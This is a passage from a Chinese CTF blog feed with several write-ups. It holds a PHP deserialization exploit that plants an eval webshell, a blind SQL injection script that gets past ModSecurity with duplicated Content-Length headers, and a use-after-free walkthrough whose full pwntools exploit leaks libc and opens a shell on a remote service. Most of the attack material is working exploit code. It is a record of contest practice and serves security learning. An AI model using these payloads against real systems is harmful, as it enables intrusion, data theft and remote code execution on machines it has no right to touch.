class="line"></span><br><span class="line">    <span class="keyword">public</span> $complete = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store = <span class="keyword">new</span> B();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key = <span class="string">'hi.php'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cache = [<span class="string">'path'</span>=&gt;<span class="string">'a'</span>,<span class="string">'dirname'</span>=&gt;base64_encode(<span class="string">'&lt;?php eval($_GET[a]);   ?'</span>.<span class="string">'&gt; '</span>)];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $options = [</span><br><span class="line">        <span class="string">'serialize'</span> =&gt; <span class="string">'serialize'</span>,</span><br><span class="line">        <span class="string">'prefix'</span> =&gt; <span class="string">'php://filter/write=convert.base64-decode/resource=uploads/'</span>,</span><br><span class="line">        <span class="string">'data_compress'</span> =&gt; <span class="keyword">false</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $writeTimes = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">'http://111.186.57.61:10401/?data='</span> . urlencode(serialize(<span class="keyword">new</span> A())));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'====='</span>;</span><br></pre></td></tr></table></figure><h2 id="ezjjava"><a href="#ezjjava" class="headerlink" title="ezjjava"></a>ezjjava</h2><p>fastjson 1.2.47 RCE<br><a href="https://github.com/CaijiOrz/fastjson-1.2.47-RCE" target="_blank" rel="noopener">https://github.com/CaijiOrz/fastjson-1.2.47-RCE</a></p><h2 id="ezwaf"><a href="#ezwaf" class="headerlink" title="ezwaf"></a>ezwaf</h2><p>参考之前 RoarCTF 中畸形包绕 modsecurity  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    </span><br><span class="line">    res = <span class="string">'flag&#123;abypass_modsecurity'</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>, <span class="number">50</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">            payload = <span class="string">'''GET /?age=1%20or%201%20and%20ascii(substr((select%20*%20from%20flag_xdd),&#123;&#125;,1))=&#123;&#125;%20and%20sleep(0.7) HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 111.186.57.43:10601</span></span><br><span class="line"><span class="string">Content-Length: 0</span></span><br><span class="line"><span class="string">Content-Length: 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span>.format(str(i), str(j))</span><br><span class="line">            exp = payload.encode().replace(<span class="string">b'\n'</span>, <span class="string">b'\r\n'</span>)</span><br><span class="line">            <span class="comment"># print(exp)</span></span><br><span class="line">            <span class="keyword">if</span> send_raw(exp):</span><br><span class="line">                res += chr(j)</span><br><span class="line">                print(res)</span><br><span class="line">                <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hacknote</title>
      <link href="/2019/11/19/hacknote/"/>
      <url>/2019/11/19/hacknote/</url>
      
        <content type="html"><![CDATA[<p>简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况</p><ul><li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</li></ul><p>而我们一般所指的 <strong>Use After Free</strong> 漏洞主要是后两种。此外，<strong>我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</strong></p><p>首先检查一下程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Desktop/share/攻防世界PWN/hacknote$ checksec hacknote</span><br><span class="line">[*] &apos;/mnt/hgfs/share/\xe6\x94\xbb\xe9\x98\xb2\xe4\xb8\x96\xe7\x95\x8cPWN/hacknote/hacknote&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>然后用IDA Pro检查一下程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">      v0 = atoi(&amp;buf);</span><br><span class="line">      <span class="keyword">if</span> ( v0 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      Delete_note();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v0 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        Print_note();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v0 == <span class="number">4</span> )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v0 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      Add_note();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以简单分析下程序，可以看出在程序的开头有个 menu 函数，其中有</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">puts(&quot; 1. Add note          &quot;);</span><br><span class="line">puts(&quot; 2. Delete note       &quot;);</span><br><span class="line">puts(&quot; 3. Print note        &quot;);</span><br><span class="line">puts(&quot; 4. Exit              &quot;);</span><br></pre></td></tr></table></figure><p>故而程序应该主要有 3 个功能。之后程序会根据用户的输入执行相应的功能。</p><h4 id="add-note"><a href="#add-note" class="headerlink" title="add_note"></a>add_note</h4><p>根据程序，我们可以看出程序最多可以添加 5 个 note。每个 note 有两个字段 put 与 content，其中 put 会被设置为一个函数，其函数会输出 content 具体的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">unsigned int sub_8048646()</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v0; // ebx</span><br><span class="line">  signed int i; // [esp+Ch] [ebp-1Ch]</span><br><span class="line">  int size; // [esp+10h] [ebp-18h]</span><br><span class="line">  char buf; // [esp+14h] [ebp-14h]</span><br><span class="line">  unsigned int v5; // [esp+1Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(0x14u);</span><br><span class="line">  if ( dword_804A04C &lt;= 5 )</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i = 0; i &lt;= 4; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( !ptr[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        ptr[i] = malloc(8u);</span><br><span class="line">        if ( !ptr[i] )</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;Alloca Error&quot;);</span><br><span class="line">          exit(-1);</span><br><span class="line">        &#125;</span><br><span class="line">        *(_DWORD *)ptr[i] = sub_804862B;</span><br><span class="line">        printf(&quot;Note size :&quot;);</span><br><span class="line">        read(0, &amp;buf, 8u);</span><br><span class="line">        size = atoi(&amp;buf);</span><br><span class="line">        v0 = ptr[i];</span><br><span class="line">        v0[1] = malloc(size);</span><br><span class="line">        if ( !*((_DWORD *)ptr[i] + 1) )</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;Alloca Error&quot;);</span><br><span class="line">          exit(-1);</span><br><span class="line">        &#125;</span><br><span class="line">        printf(&quot;Content :&quot;);</span><br><span class="line">        read(0, *((void **)ptr[i] + 1), size);</span><br><span class="line">        puts(&quot;Success !&quot;);</span><br><span class="line">        ++dword_804A04C;</span><br><span class="line">        return __readgsdword(0x14u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Full&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="print-note"><a href="#print-note" class="headerlink" title="print_note"></a>print_note</h4><p>print_note 就是简单的根据给定的 note 的索引来输出对应索引的 note 的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">unsigned int print_note()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [esp+4h] [ebp-14h]</span><br><span class="line">  char buf; // [esp+8h] [ebp-10h]</span><br><span class="line">  unsigned int v3; // [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(0x14u);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, &amp;buf, 4u);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( notelist[v1] )</span><br><span class="line">    notelist[v1]-&gt;put(notelist[v1]);</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="delete-note"><a href="#delete-note" class="headerlink" title="delete_note"></a>delete_note</h4><p>delete_note 会根据给定的索引来释放对应的 note。但是值得注意的是，在 删除的时候，只是单纯进行了 free，而没有设置为 NULL，那么显然，这里是存在 Use After Free 的情况的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">unsigned int del_note()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [esp+4h] [ebp-14h]</span><br><span class="line">  char buf; // [esp+8h] [ebp-10h]</span><br><span class="line">  unsigned int v3; // [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(0x14u);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, &amp;buf, 4u);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( notelist[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    free(notelist[v1]-&gt;content);</span><br><span class="line">    free(notelist[v1]);</span><br><span class="line">    puts(&quot;Success&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到<strong>UAF</strong>的情况确实可能会发生，那么怎么可以让它发生并且进行利用呢？需要同时注意的是，这个程序中还有一个<strong>magic</strong>函数，我们有没有可能来通过<strong>UAF</strong>来使得这个程序执行 <strong>magic</strong> 函数呢？<strong>一个很直接的想法是修改 note 的 put 字段为 magic 函数的地址，从而实现在执行 print note 的时候执行 magic 函数。</strong> 那么该怎么执行呢？                                                                         </p><p>我们可以简单来看一下每一个 <strong>note</strong> 生成的具体流程</p><ol><li><p>程序申请 8 字节内存用来存放 <strong>note</strong> 中的 <strong>put</strong> 以及 <strong>content</strong> 指针</p></li><li><p>程序根据输入的 size 来申请指定大小的内存，然后用来存储 <strong>content</strong></p><p>基本的思路是先add 两次，但是内容的大小不能是8字节，不然会分配 4个16字节的fast bin，那我们就没办法进行UAF，所以分配content的大小必须不是8字节，然后再delete两次，此时 fastbin链表</p></li></ol><table><thead><tr><th align="center">note1 结构体</th><th align="center">16 bytes（8B)</th><th align="center">high address</th></tr></thead><tbody><tr><td align="center"><strong>note1 content</strong></td><td align="center"><strong>32 bytes（16B)</strong></td><td align="center"></td></tr><tr><td align="center"><strong>note0 结构体</strong></td><td align="center"><strong>16 bytes（8B)</strong></td><td align="center"></td></tr><tr><td align="center"><strong>note0 content</strong></td><td align="center"><strong>32 bytes（16B)</strong></td><td align="center"></td></tr><tr><td align="center"><strong>fastbin head</strong></td><td align="center"></td><td align="center"><strong>low address</strong></td></tr></tbody></table><p>由于题目提供了<strong>libc</strong>，我们可以先触发一次漏洞来泄露地址，然后再触发一次漏洞来执行system</p><p>这里有个问题就是<strong>system</strong>函数的参数，原来的<strong>printf</strong>函数传入的是指向结构体的指针，那么此时system传入该函数的参数就是<strong>note0</strong>结构体自身，无法直接传如字符串“<strong>\bin\sh</strong>”，这里的知识点是<strong>system</strong>参数可用“||”截断，比如 <strong>system(“hsasoijiojo||/bin/sh”)</strong></p><p>我们来调试一下</p><p>当我们进行第一次add note的时候</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received <span class="number">0xc5</span> bytes:</span><br><span class="line">    '----------------------\n'</span><br><span class="line">    '       HackNote       \n'</span><br><span class="line">    '----------------------\n'</span><br><span class="line">    ' 1. Add note          \n'</span><br><span class="line">    ' 2. Delete note       \n'</span><br><span class="line">    ' 3. Print note        \n'</span><br><span class="line">    ' 4. Exit              \n'</span><br><span class="line">    '----------------------\n'</span><br><span class="line">    'Your choice :'</span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line">    '1\n'</span><br><span class="line">[DEBUG] Received <span class="number">0xb</span> bytes:</span><br><span class="line">    'Note size :'</span><br><span class="line">[DEBUG] Sent <span class="number">0x3</span> bytes:</span><br><span class="line">    '32\n'</span><br><span class="line">[DEBUG] Received <span class="number">0x9</span> bytes:</span><br><span class="line">    'Content :'</span><br><span class="line">[DEBUG] Sent <span class="number">0x8</span> bytes:</span><br><span class="line">    <span class="string">'a'</span> * <span class="number">0x8</span></span><br><span class="line">[DEBUG] Received <span class="number">0xa</span> bytes:</span><br><span class="line">    'Success !\n'</span><br></pre></td></tr></table></figure><p>查看堆的情况</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line"><span class="number">0x9d9b008</span> PREV_INUSE &#123;</span><br><span class="line">  mchunk_prev_size = <span class="number">0</span>, </span><br><span class="line">  mchunk_size = <span class="number">337</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x9d9b158</span> FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size = <span class="number">0</span>, </span><br><span class="line">  mchunk_size = <span class="number">17</span>, </span><br><span class="line">  fd = <span class="number">0x804862b</span>, </span><br><span class="line">  bk = <span class="number">0x9d9b170</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x31</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x9d9b168</span> FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size = <span class="number">0</span>, </span><br><span class="line">  mchunk_size = <span class="number">49</span>, </span><br><span class="line">  fd = <span class="number">0x61616161</span>, </span><br><span class="line">  bk = <span class="number">0x61616161</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现已经分配了一个大小为17的chunk（即note0的结构体），和一个大小为49的chunk（即note0的content），note1同理</p><p>当删除的时候fastbin列表就像我们设想的那样，这里有一个坑，如果是本地调试的话，tcache是libc2.26之后引进的一种新机制，类似于fastbin一样的东西，每条链上最多可以有 7 个 chunk，free的时候当tcache满了才放入fastbin，unsorted bin，malloc的时候优先去tcache找</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gef➤  heap bins</span><br><span class="line">───────────────────────────────────────────────────────────[ Fastbins <span class="keyword">for</span> arena <span class="number">0xf7fac780</span> ]───────────────────────────────────────────────────────────</span><br><span class="line">Fastbins[idx=<span class="number">0</span>, size=<span class="number">0x8</span>]  ←  UsedChunk(addr=<span class="number">0x804b040</span>, size=<span class="number">0x10</span>)  ←  UsedChunk(addr=<span class="number">0x804b008</span>, size=<span class="number">0x10</span>) </span><br><span class="line">Fastbins[idx=<span class="number">1</span>, size=<span class="number">0xc</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">2</span>, size=<span class="number">0x10</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">3</span>, size=<span class="number">0x14</span>]  ←  UsedChunk(addr=<span class="number">0x804b050</span>, size=<span class="number">0x28</span>)  ←  UsedChunk(addr=<span class="number">0x804b018</span>, size=<span class="number">0x28</span>) </span><br><span class="line">Fastbins[idx=<span class="number">4</span>, size=<span class="number">0x18</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">5</span>, size=<span class="number">0x1c</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">6</span>, size=<span class="number">0x20</span>] <span class="number">0x00</span></span><br></pre></td></tr></table></figure><p>最终的EXP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh=process('./hacknote')</span></span><br><span class="line">sh=remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10102</span>)</span><br><span class="line">elf=ELF(<span class="string">'./hacknote'</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line"><span class="comment">#libc=ELF('/lib/i386-linux-gnu/libc.so.6')</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addnote</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Note size :'</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(<span class="string">'Content :'</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">addnote(<span class="number">0x20</span>,<span class="string">'aaaaaaaa'</span>) <span class="comment">#idx0</span></span><br><span class="line">addnote(<span class="number">0x20</span>,<span class="string">'aaaaaaaa'</span>) <span class="comment">#idx1</span></span><br><span class="line"></span><br><span class="line">delnote(<span class="number">0</span>)</span><br><span class="line">delnote(<span class="number">1</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">'puts'</span>]</span><br><span class="line">fun=<span class="number">0x0804862B</span></span><br><span class="line">addnote(<span class="number">0x8</span>,p32(fun)+p32(puts_got)) </span><br><span class="line">printnote(<span class="number">0</span>)</span><br><span class="line">puts_adr=u32(sh.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'puts_adr: '</span>+hex(puts_adr)</span><br><span class="line">libc_base=puts_adr-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'libc_base: '</span>+hex(libc_base)</span><br><span class="line"></span><br><span class="line">system_adr=libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">delnote(<span class="number">2</span>)</span><br><span class="line">payload=p32(system_adr)+<span class="string">'||sh'</span></span><br><span class="line">addnote(<span class="number">0x8</span>,payload)</span><br><span class="line">printnote(<span class="number">0</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF-PWN-Tips-1</title>
      <link href="/2019/11/16/CTF-PWN-Tips-1/"/>
      <url>/2019/11/16/CTF-PWN-Tips-1/</url>
      
